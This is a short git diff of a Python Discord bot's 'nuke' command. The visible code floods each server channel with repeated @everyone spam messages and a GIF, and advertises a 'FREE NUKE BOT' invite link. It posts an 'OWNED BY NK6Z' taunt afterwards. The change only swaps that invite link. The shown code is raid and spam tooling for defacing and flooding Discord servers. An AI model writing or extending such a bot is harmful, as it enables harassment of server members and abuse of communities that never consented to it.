@@ -53,7 +53,7 @@ async def nuke(ctx, message_count: int = 3):
                 tasks.append(channel.send("@everyone PLEURER BIEN"))
                 tasks.append(channel.send("@everyone bebelwed ON TOP"))
                 tasks.append(channel.send("https://tenor.com/view/anime-code-geass-laughing-laugh-gif-27600912"))
-                tasks.append(channel.send("@everyone FREE NUKE BOT AT https://discord.gg/5WaqYaaXa7"))
+                tasks.append(channel.send("@everyone FREE NUKE BOT AT https://discord.gg/B9J8dFwwkc"))
 
             
         except Exception as e:
@@ -66,4 +66,5 @@ async def nuke(ctx, message_count: int = 3):
     await ctx.send(f"OWNED BY NK6Z | {message_count * 3} messages envoyés dans chaque canal.")
 
 webserver.keep_alive()
+
 bot.run(TOKEN)
